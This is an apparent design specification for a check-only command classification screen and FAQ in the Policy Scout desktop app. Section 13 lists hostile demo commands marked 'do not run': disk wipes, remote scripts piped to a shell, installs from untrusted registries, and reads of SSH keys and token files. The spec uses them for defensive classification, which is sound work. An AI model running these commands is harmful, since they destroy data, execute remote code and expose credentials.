# Policy Scout — Tauri Decision Check + Guided FAQ Boundary v0.3

## 1. Purpose

Define the safe boundary for a check-only Decision Check UI and Guided FAQ system in the Tauri desktop dashboard. This feature allows users to paste/type command strings and ask Policy Scout how it would classify/check the command, without executing it. It also provides guided FAQ buttons that populate useful educational prompts or safe check examples, helping users learn how to operate Policy Scout features safely.

**Core principle:** Decision Check is classification/check-only. The UI must never execute commands, resolve approvals, migrate sandbox results, perform cleanup deletion, or expose shell execution. Rust owns command construction. CLI remains policy authority.

---

## 2. Feature Summary

### Decision Check UI

A read-only/check-only UI area where a user can:
- Paste or type a command string into a text input
- Click "Check" to ask Policy Scout how it would classify the command
- View the policy decision, risk score, category, capabilities, reasons, and recommended next action
- See the exact CLI command that would be used for manual execution

### Guided FAQ System

A set of clickable FAQ buttons that:
- Populate the command check input with safe example commands
- Display explanation panels about Policy Scout features
- Show educational content about command safety, package installs, sandbox workflow, cleanup dry-run, sweep findings, reports and audit, approvals, credential hygiene, troubleshooting, and dashboard navigation
- Never execute anything — they only populate UI state or show explanations

---

## 3. Non-goals

This feature does NOT:
- Execute commands through the UI
- Add command execution UI, approval resolution UI, sandbox migration UI, or cleanup deletion UI
- Expose shell plugin or arbitrary argv arrays from the frontend
- Allow users to bypass policy decisions
- Change CLI JSON shapes or command behavior
- Add dependencies or modify the codebase (this is a boundary spec only)
- Implement Rust code, TypeScript code, or Python code
- Add tests (this is a design doc, not implementation)
- Commit until approved

---

## 4. Safety Boundary

### Critical Boundary Rules

Decision Check is classification/check-only. The UI must never:
- Execute the command
- Resolve approvals
- Migrate sandbox results
- Perform cleanup deletion
- Expose shell plugin
- Accept frontend-provided argv arrays
- Call `policy-scout run`
- Call `policy-scout sandbox install/apply/migrate`
- Call approval approve/deny commands
- Call cleanup without --dry-run

### Ownership

- **Rust owns command construction:** The Rust adapter constructs the exact CLI invocation
- **CLI remains policy authority:** Policy Scout CLI makes the final decision
- **UI is a viewer:** The UI displays decisions and evidence, does not govern

### Input Validation

- `command_text` is one string, not an argv array from the frontend
- Rust enforces max length (e.g., 2,000 or 4,000 characters)
- Rust rejects empty/whitespace-only input
- Rust rejects NUL characters
- Rust does not split command into shell words
- Rust never calls `Command::new(command_text)` — only `Command::new("policy-scout")` with fixed args

---

## 5. Allowed CLI Path

### Exact CLI Invocation

The Decision Check feature may only call:

```bash
policy-scout check --json <command_text>
```

### Current CLI Behavior (from probes)

- `policy-scout check --help` shows: `usage: main.py check [-h] [--json] [--no-audit] [--no-approval] [--report] ... command`
- The command is passed as a positional argument after flags
- `--json` flag outputs structured JSON
- Exit codes: 0 (success), 10 (risky/approval/sandbox), 20 (denied), 30 (error)
- JSON response includes: request_id, command, decision, risk_score, risk_band, category, capabilities, reasons, recommended_next_action, confidence, registry_hits, policy_hits

### Example Outputs

**Safe example:**
```bash
policy-scout check --json "npm install left-pad"
```
Returns: decision "SANDBOX_FIRST", risk_score 6, category "package_install", capabilities ["network.fetch", "filesystem.project_write", "package.install", "lifecycle.execute_possible"]

**Unsafe example:**
```bash
policy-scout check --json "rm -rf /tmp/demo"
```
Returns: decision "DENY", risk_score 5, category "destructive", capabilities ["destructive.mutation", "filesystem.project_write", "filesystem.system_write"]

---

## 6. Forbidden CLI Paths

The Decision Check feature must NEVER call:

- `policy-scout run` — execution path
- `policy-scout sandbox install/apply/migrate` — mutation path
- `policy-scout approvals approve/deny` — approval resolution path
- `policy-scout data cleanup` without `--dry-run` — deletion path
- Direct shell execution via `sh`, `bash`, or system calls
- Arbitrary subprocess spawning with user-provided argv

---

### 7. User Stories

#### As a developer using Policy Scout
- I want to paste a command into the UI and see how Policy Scout would classify it, so I can understand the risk before running it manually
- I want to see the exact CLI command I can run manually, so I can execute it from my terminal with full control
- I want to understand why a command was classified as risky or denied, so I can learn safe patterns

#### As a new user learning Policy Scout
- I want to click FAQ buttons to see safe example commands, so I can understand what kinds of commands Policy Scout checks
- I want to read explanations about package installs, sandbox workflow, and cleanup dry-run, so I can learn how to use Policy Scout safely
- I want to understand the difference between "check" and "run", so I don't accidentally execute something I only wanted to inspect

#### As a security-conscious user
- I want to confirm that the UI never executes commands, so I can trust it as a check-only surface
- I want to see the policy decision and risk score for a command, so I can make informed decisions about what to run manually
- I want to understand what "could-not-verify" means in sweep findings, so I know when to investigate further

---

## 8. Command Check Input Model

### Input Field

- **Type:** Textarea (multi-line) for command strings
- **Label:** "Command to check (does not execute)"
- **Placeholder:** "e.g., npm install left-pad"
- **Max length:** 2,000 characters (enforced in Rust)
- **Behavior:** User types or pastes command string

### Validation (Rust-side)

- Reject empty string
- Reject whitespace-only string
- Reject strings exceeding max length
- Reject strings containing NUL characters
- Do not split into shell words in Rust
- Pass the exact string as a single argument to CLI

### Button

- **Label:** "Check command" (not "Run command" or "Execute")
- **Action:** Triggers Rust adapter `check_command(command_text)`
- **State:** Disabled while loading, disabled if input is empty

---

## 9. Guided FAQ Model

### FAQ Button Types

1. **Populate Input** — Clicking populates the command check input with a safe example command
2. **Show Explanation** — Clicking displays an explanation panel with educational content
3. **Both** — Clicking populates input AND shows explanation

### FAQ Panel

- **Location:** Dedicated panel or modal
- **Content:** Static educational text about Policy Scout features
- **Behavior:** Does not execute anything, only displays text
- **Closeable:** User can dismiss the panel

### FAQ State

- `selectedFaqId` — tracks which FAQ is currently displayed
- `explanationText` — the explanation content to show
- FAQ buttons do not trigger CLI calls

---

## 10. FAQ Category Taxonomy

### 1. Command Safety
- What does Policy Scout check before npm install?
- How do I check whether a command would need approval?
- Why was this command blocked?
- What is the difference between check and run?

### 2. Package Installs
- What does sandbox install mean?
- How do I safely inspect a suspicious package?
- What are lifecycle scripts?
- Why does npm install need sandbox review?

### 3. Sandbox Workflow
- What does dry-run cleanup show?
- How do I migrate sandbox results to host?
- What does sandbox-first mean?
- When should I use sandbox install?

### 4. Cleanup Dry-Run
- What cleanup targets are available?
- Is cleanup safe to run?
- What does DRY RUN ONLY mean?
- Can I undo cleanup?

### 5. Sweep Findings
- How do I read a Scout report?
- What does could-not-verify mean?
- What should I do after a suspicious sweep finding?
- What is the difference between project sweep and quick sweep?

### 6. Reports and Audit
- How do I find past command decisions?
- What information is in an audit event?
- How long are reports kept?
- Can I export reports?

### 7. Approvals
- How do I approve a command?
- What is an approval request?
- Can agents approve their own requests?
- How long do approvals last?

### 8. Credential Hygiene
- What should I do before rotating credentials?
- What files does Policy Scout check for credentials?
- What does credential-adjacent mean?
- How do I review credential exposure in reports?

### 9. Troubleshooting
- Why does browser preview show Tauri runtime unavailable?
- What does local-first mean here?
- How do I check if Policy Scout is working?
- What do I do if a command hangs?

### 10. Dashboard Navigation
- How do I navigate between cards?
- What do the different cards show?
- How do I open report details?
- How do I filter audit events?

---

## 11. Proposed FAQ Prompts

48 prompts across 10 categories: Command Safety (8), Package Installs (6), Sandbox Workflow (5), Cleanup Dry-Run (4), Sweep Findings (5), Reports and Audit (4), Approvals (4), Credential Hygiene (4), Troubleshooting (4), Dashboard Navigation (4).

### Command Safety (8 prompts)
- What does Policy Scout check before npm install?
- How do I check whether a command would need approval?
- Why was this command blocked?
- What is the difference between check and run?
- What commands are always denied?
- What is a risk score?
- What are policy capabilities?
- How do I interpret a DENY decision?

### Package Installs (6 prompts)
- What does sandbox install mean?
- How do I safely inspect a suspicious package?
- What are lifecycle scripts?
- Why does npm install need sandbox review?
- What is dependency confusion?
- What is typosquatting?

### Sandbox Workflow (5 prompts)
- What does dry-run cleanup show?
- How do I migrate sandbox results to host?
- What does sandbox-first mean?
- When should I use sandbox install?
- What happens in a sandbox workspace?

### Cleanup Dry-Run (4 prompts)
- What cleanup targets are available?
- Is cleanup safe to run?
- What does DRY RUN ONLY mean?
- Can I undo cleanup?

### Sweep Findings (5 prompts)
- How do I read a Scout report?
- What does could-not-verify mean?
- What should I do after a suspicious sweep finding?
- What is the difference between project sweep and quick sweep?
- What are sweep findings vs confirmed malware?

### Reports and Audit (4 prompts)
- How do I find past command decisions?
- What information is in an audit event?
- How long are reports kept?
- Can I export reports?

### Approvals (4 prompts)
- How do I approve a command?
- What is an approval request?
- Can agents approve their own requests?
- How long do approvals last?

### Credential Hygiene (4 prompts)
- What should I do before rotating credentials?
- What files does Policy Scout check for credentials?
- What does credential-adjacent mean?
- How do I review credential exposure in reports?

### Troubleshooting (4 prompts)
- Why does browser preview show Tauri runtime unavailable?
- What does local-first mean here?
- How do I check if Policy Scout is working?
- What do I do if a command hangs?

### Dashboard Navigation (4 prompts)
- How do I navigate between cards?
- What do the different cards show?
- How do I open report details?
- How do I filter audit events?

---

## 12. Safe Example Commands

These are benign examples for check-only demonstration:

### Package Installs
- `npm install left-pad`
- `npm install`
- `pip install requests`
- `pnpm add lodash`
- `yarn add axios`

### Safe Inspection
- `python -m pytest`
- `git status`
- `ls -la`
- `cat package.json`
- `git log --oneline -5`

### Safe File Operations
- `cp file.txt file-backup.txt`
- `mv old.txt new.txt`
- `touch newfile.txt`

### Safe System Commands
- `ps aux | grep node`
- `netstat -tulpn | grep LISTEN`
- `df -h`
- `free -m`

---

## 13. Unsafe Example Commands for Check-Only Demonstration

These are examples only for classification/check-only UI demonstration. They must be clearly labeled "do not run" and never executed:

### Destructive Commands
- `rm -rf /` (do not run)
- `rm -rf ~/.config` (do not run)
- `chmod -R 777 /` (do not run)
- `dd if=/dev/zero of=/dev/sda` (do not run)

### Network-Fetched Execution
- `curl http://example.com/install.sh | bash` (do not run)
- `wget -O- https://example.com/script.sh | sh` (do not run)
- `eval "$(curl -fsSL https://example.com/install.sh)"` (do not run)

### Suspicious Package Installs
- `npm install suspicious-package --ignore-scripts=false` (do not run)
- `pip install http://untrusted-source.com/package.tar.gz` (do not run)
- `npm install package --registry http://malicious-registry.com` (do not run)

### Credential Exposure
- `cat ~/.ssh/id_rsa` (do not run)
- `cat .env` (do not run)
- `grep -r "TOKEN" .` (do not run)
- `cat ~/.npmrc` (do not run)

**Note:** These examples are for classification/check-only UI to demonstrate how Policy Scout identifies dangerous patterns. They must never be executed through the UI.

---

## 14. Rust Adapter Design

### Proposed Tauri Command

```rust
#[tauri::command]
fn check_command(command_text: String) -> Result<CliJsonResponse, String>
```

### Validation Requirements

1. **Max length:** Reject strings exceeding 2,000 or 4,000 characters
2. **Empty check:** Reject empty or whitespace-only input
3. **NUL check:** Reject strings containing NUL characters
4. **No shell splitting:** Do not split command into shell words in Rust
5. **No shell plugin:** Never call `Command::new(command_text)`
6. **Fixed CLI args:** Only call `Command::new("policy-scout")` with fixed args

### CLI Invocation

```rust
let output = Command::new("policy-scout")
    .args(["check", "--json", &command_text])
    .output()?;
```

### Error Handling

- Return `CliJsonResponse { ok: false, exit_code: -1, data: None, error: Some("..."), stderr_summary: None }` for invalid input
- Return CLI response as-is for valid input (including DENY decisions)
- Never expose raw shell errors to frontend

### Validation Helper (proposed)

```rust
fn validate_command_text(command_text: &str) -> Result<(), CliJsonResponse> {
    if command_text.is_empty() {
        return Err(CliJsonResponse {
            ok: false,
            exit_code: -1,
            data: None,
            error: Some("Command text cannot be empty".to_string()),
            stderr_summary: None,
        });
    }
    if command_text.trim().is_empty() {
        return Err(CliJsonResponse {
            ok: false,
            exit_code: -1,
            data: None,
            error: Some("Command text cannot be whitespace only".to_string()),
            stderr_summary: None,
        });
    }
    if command_text.len() > 2000 {
        return Err(CliJsonResponse {
            ok: false,
            exit_code: -1,
            data: None,
            error: Some("Command text exceeds maximum length of 2000 characters".to_string()),
            stderr_summary: None,
        });
    }
    if command_text.contains('\0') {
        return Err(CliJsonResponse {
            ok: false,
            exit_code: -1,
            data: None,
            error: Some("Command text contains invalid NUL character".to_string()),
            stderr_summary: None,
        });
    }
    Ok(())
}
```

---

## 15. Frontend Component Design

### Proposed Components

#### DecisionCheckCard
- **Purpose:** Main card for command check input and result display
- **State:**
  - `commandText: string`
  - `checkResult: CliJsonResponse | null`
  - `loading: boolean`
  - `error: string | null`
- **UX:**
  - "Check only — does not execute" banner at top
  - Textarea for command input
  - "Check command" button (not "Run command")
  - Result panel showing decision, risk, category, capabilities, reasons
  - Exact CLI command shown for manual execution
  - Clear "not executed" marker

#### GuidedFaqPanel
- **Purpose:** Display FAQ buttons and explanation content
- **State:**
  - `selectedFaqId: string | null`
  - `explanationText: string | null`
- **UX:**
  - FAQ buttons organized by category
  - Explanation panel displays when FAQ is selected
  - FAQ buttons can populate command input OR show explanation OR both
  - No execution triggered by FAQ buttons

#### CommandCheckResultPanel
- **Purpose:** Display structured check result
- **Props:**
  - `result: CliJsonResponse`
- **UX:**
  - Decision badge (ALLOW, REQUIRE_APPROVAL, SANDBOX_FIRST, DENY)
  - Risk score and band
  - Category label
  - Capabilities list
  - Reasons list
  - Recommended next action
  - Exact CLI command for manual execution
  - "Not executed" marker

---

## 16. Result Display Design

### Decision Display

- **ALLOW:** Green badge
- **ALLOW_LOGGED:** Green badge with "logged" note
- **REQUIRE_APPROVAL:** Amber badge
- **SANDBOX_FIRST:** Blue badge
- **DENY:** Red badge
- **DENY_AND_ALERT:** Red badge with "alert" note

### Risk Score Display

- **1-3 (low):** Green
- **4-6 (medium):** Amber
- **7-10 (high):** Red

### Category Display

- Text label showing command category (e.g., "package_install", "destructive", "credential_adjacent")

### Capabilities Display

- List of capability badges (e.g., "network.fetch", "filesystem.project_write")
- Each capability styled as a small pill

### Reasons Display

- Bulleted list of reasons from CLI response
- Each reason on its own line

### Recommended Next Action Display

- Prominent text showing recommended action
- Call-to-action style if appropriate

### Exact CLI Command Display

- Monospace code block showing the exact CLI command
- Copy button for convenience
- Label: "Run this command manually from your terminal"

### "Not Executed" Marker

- Prominent banner or badge
- Text: "Check only — command was not executed"
- Styled distinctly from execution results

---

## 17. Error/Empty-State Design

### Empty State (No Input)

- Placeholder text in textarea
- "Check command" button disabled
- No result panel shown

### Empty State (No Result)

- After check, if result is empty or malformed
- Show error message: "Unable to parse check result"
- Offer retry button

### Error State (Validation Error)

- Show error message from Rust validation
- Examples:
  - "Command text cannot be empty"
  - "Command text exceeds maximum length of 2000 characters"
  - "Command text contains invalid NUL character"
- Show error in dedicated error panel

### Error State (CLI Error)

- Show error message from CLI stderr
- Include exit code
- Show "could_not_verify" flag if present
- Offer retry button

### Loading State

- Show spinner or loading indicator
- Disable "Check command" button
- Disable FAQ buttons that would populate input

---

## 18. Audit/Report Implications

### Audit Events

- Decision Check UI should generate audit events when checks are performed
- Event type: `CommandChecked` or similar
- Include: request_id, command, decision, risk_score, category
- Audit event should indicate "check-only" not "executed"

### Scout Reports

- Decision Check UI does not generate Scout Reports by default
- User can optionally generate a report with `--report` flag if implemented
- Report should clearly indicate "check-only" not "executed"

### Audit Trail

- All checks performed through UI should be auditable
- Audit events should distinguish between "check" and "run"
- Audit events should include actor (UI vs CLI)

---

## 19. Testing Strategy

### Rust Validation Unit Tests

- Test empty string rejection
- Test whitespace-only rejection
- Test max length enforcement
- Test NUL character rejection
- Test valid string acceptance
- Test error response shape

### Tauri Command Tests

- Test `check_command` with valid command
- Test `check_command` with invalid command (empty, too long, NUL)
- Test CLI subprocess integration
- Test JSON parsing success
- Test error propagation

### Frontend Component Tests (if test framework added)

- Test DecisionCheckCard renders correctly
- Test "Check command" button disabled when input empty
- Test loading state shown during check
- Test result panel displays correctly
- Test error state displays correctly
- Test FAQ buttons populate input or show explanation

### CLI JSON Contract Tests

- Test `policy-scout check --json` returns valid JSON
- Test JSON includes all expected fields
- Test exit codes match expected values
- Test redaction applied where expected

### Manual Native Smoke Tests

- Test Decision Check card loads without crash
- Test command input accepts text
- Test "Check command" button triggers check
- Test result displays correctly
- Test FAQ buttons work
- Test no execution occurs
- Test "not executed" marker visible

### Negative Safety Tests

- Test no execution button exists
- Test no approval resolution UI exists
- Test no sandbox migration UI exists
- Test no cleanup deletion UI exists
- Test no shell plugin access
- Test no arbitrary argv arrays accepted

---

## 20. Native Manual Smoke Additions

Add to `docs/compressed/TAURI_NATIVE_MANUAL_SMOKE_CHECKLIST_SOURCE.md`:

### Decision Check Card

- [ ] Card loads without crash
- [ ] "Check only — does not execute" banner visible
- [ ] Textarea accepts command input
- [ ] "Check command" button labeled correctly (not "Run")
- [ ] Clicking "Check command" triggers check
- [ ] Result displays decision, risk, category, capabilities, reasons
- [ ] Exact CLI command shown for manual execution
- [ ] "Not executed" marker visible
- [ ] No execution button present

### Guided FAQ Panel

- [ ] FAQ buttons visible and organized by category
- [ ] Clicking FAQ button populates input OR shows explanation
- [ ] FAQ buttons do not trigger CLI calls
- [ ] Explanation panel displays correctly
- [ ] Explanation panel can be closed
- [ ] FAQ content is educational, not executable

### Negative Safety Checks

- [ ] No "Run" or "Execute" button
- [ ] No approval resolution UI
- [ ] No sandbox migration UI
- [ ] No cleanup deletion UI
- [ ] No shell plugin access
- [ ] No arbitrary argv arrays

---

## 21. Security Review Checklist

### Input Validation

- [ ] Max length enforced in Rust
- [ ] Empty/whitespace-only input rejected
- [ ] NUL characters rejected
- [ ] No shell splitting in Rust
- [ ] No `Command::new(command_text)` usage

### CLI Boundary

- [ ] Only `policy-scout check --json` called
- [ ] No `policy-scout run` called
- [ ] No `policy-scout sandbox install/apply/migrate` called
- [ ] No approval approve/deny called
- [ ] No cleanup without --dry-run called

### UI Boundary

- [ ] No execution button
- [ ] No approval resolution UI
- [ ] No sandbox migration UI
- [ ] No cleanup deletion UI
- [ ] No shell plugin access
- [ ] No arbitrary argv arrays from frontend

### Data Flow

- [ ] Rust owns command construction
- [ ] CLI remains policy authority
- [ ] UI is viewer only
- [ ] Audit events generated for checks
- [ ] Audit events distinguish check vs run

### Redaction

- [ ] Redaction placeholders preserved in display
- [ ] No raw secrets displayed
- [ ] Redaction notice shown when applied

---

## 22. Implementation Sequence

### Phase 1: Boundary Doc (this document)
- [x] Create boundary spec
- [ ] Review and approve
- [ ] No code changes yet

### Phase 2: CLI Contract Probe
- [ ] Verify `policy-scout check --json` behavior
- [ ] Document exact JSON shape
- [ ] Add CLI JSON contract tests if needed
- [ ] Confirm exit codes and error handling

### Phase 3: Rust Adapter
- [ ] Add `validate_command_text` helper
- [ ] Add `check_command` Tauri command
- [ ] Add Rust unit tests for validation
- [ ] Add Tauri command tests
- [ ] Verify CLI subprocess integration

### Phase 4: Frontend Shell
- [ ] Add `DecisionCheckCard` component
- [ ] Add `GuidedFaqPanel` component
- [ ] Add `CommandCheckResultPanel` component
- [ ] Add TypeScript types for check response
- [ ] Add static FAQ content
- [ ] Wire state management

### Phase 5: Wire Check Result Display
- [ ] Connect Rust adapter to frontend
- [ ] Display decision, risk, category, capabilities
- [ ] Display reasons and recommended action
- [ ] Show exact CLI command
- [ ] Add "not executed" marker

### Phase 6: Guided FAQ Buttons
- [ ] Add FAQ button components
- [ ] Wire FAQ click handlers
- [ ] Populate input from FAQ
- [ ] Show explanation panels
- [ ] Organize by category

### Phase 7: Native Smoke Checklist Update
- [ ] Add Decision Check checks to smoke checklist
- [ ] Add Guided FAQ checks to smoke checklist
- [ ] Run manual native smoke
- [ ] Verify safety boundaries

### Phase 8: Docs Update
- [ ] Add pointer to `docs/IMPLEMENTATION_STATUS.md`
- [ ] Add pointer to `ui/desktop/README.md` if natural
- [ ] Update `docs/compressed/TAURI_ADAPTER_BOUNDARY_SOURCE.md` if needed

### Phase 9: Push/CI Checkpoint
- [ ] Run pytest
- [ ] Run doctor
- [ ] Run eval
- [ ] Run npm build
- [ ] Run cargo check
- [ ] Run cargo test
- [ ] Verify CI passes
- [ ] Push to origin/main

---

## 23. Open Questions

### Max Length

- Should max length be 2,000 or 4,000 characters?
- Should max length be configurable?

### FAQ Content

- Should FAQ content be static or loaded from external file?
- Should FAQ content be localizable?
- Should FAQ content include screenshots?

### Audit Events

- Should Decision Check generate audit events by default?
- What event type should be used?
- Should audit events include the full command text?

### Report Generation

- Should Decision Check support `--report` flag?
- Should reports be generated for checks?
- How should check-only reports be distinguished from execution reports?

### FAQ Organization

- Should FAQ categories be collapsible?
- Should FAQ have search functionality?
- Should FAQ have a "show all" option?

### Error Handling

- Should CLI errors be shown in full or summarized?
- Should stderr be redacted in error display?
- Should timeout be configurable?

---

## 24. Acceptance Checklist

### Safety Boundary

- [ ] Decision Check is check-only, never executes
- [ ] No execution button present
- [ ] No approval resolution UI
- [ ] No sandbox migration UI
- [ ] No cleanup deletion UI
- [ ] No shell plugin access
- [ ] No arbitrary argv arrays from frontend

### Rust Adapter

- [ ] `validate_command_text` helper implemented
- [ ] Max length enforced
- [ ] Empty/whitespace-only rejected
- [ ] NUL characters rejected
- [ ] No shell splitting in Rust
- [ ] Only `policy-scout check --json` called
- [ ] Rust unit tests pass
- [ ] Tauri command tests pass

### Frontend Components

- [ ] DecisionCheckCard implemented
- [ ] GuidedFaqPanel implemented
- [ ] CommandCheckResultPanel implemented
- [ ] "Check only — does not execute" banner visible
- [ ] "Check command" button labeled correctly
- [ ] "Not executed" marker visible
- [ ] Exact CLI command shown for manual execution

### FAQ System

- [ ] FAQ buttons implemented
- [ ] FAQ categories organized
- [ ] FAQ content educational, not executable
- [ ] FAQ buttons do not trigger CLI calls
- [ ] Explanation panels display correctly

### Result Display

- [ ] Decision badge displays correctly
- [ ] Risk score displays correctly
- [ ] Category displays correctly
- [ ] Capabilities list displays correctly
- [ ] Reasons list displays correctly
- [ ] Recommended action displays correctly

### Error Handling

- [ ] Empty input rejected
- [ ] Validation errors displayed
- [ ] CLI errors displayed
- [ ] Loading states shown
- [ ] Retry buttons work

### Audit/Report

- [ ] Audit events generated for checks
- [ ] Audit events distinguish check vs run
- [ ] Redaction preserved in display
- [ ] No raw secrets displayed

### Testing

- [ ] Rust unit tests pass
- [ ] Tauri command tests pass
- [ ] CLI JSON contract tests pass
- [ ] Manual native smoke passes
- [ ] Negative safety checks pass

### Docs

- [ ] Boundary doc reviewed and approved
- [ ] IMPLEMENTATION_STATUS updated
- [ ] ui/desktop/README updated if natural
- [ ] Smoke checklist updated

### CI

- [ ] pytest passes
- [ ] doctor passes
- [ ] eval passes
- [ ] npm build passes
- [ ] cargo check passes
- [ ] cargo test passes
- [ ] CI workflow passes

---

*Document version: v0.3.0-plan — Decision Check + Guided FAQ Boundary Spec*
